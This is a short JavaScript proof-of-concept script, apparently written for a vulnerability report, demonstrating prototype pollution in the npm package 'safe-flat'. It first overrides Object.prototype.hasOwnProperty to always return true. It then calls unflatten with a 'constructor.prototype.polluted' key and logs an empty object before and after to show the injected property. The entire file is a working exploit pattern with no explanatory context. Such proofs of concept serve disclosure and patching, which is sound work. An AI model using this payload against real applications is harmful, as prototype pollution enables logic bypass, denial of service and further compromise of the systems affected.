Object.prototype.hasOwnProperty = () => true;
var safeFlat = require('safe-flat');
obj = {};
console.log({}.polluted);
safeFlat.unflatten({ 'constructor.prototype.polluted': 'yes' }, '.');
console.log({}.polluted);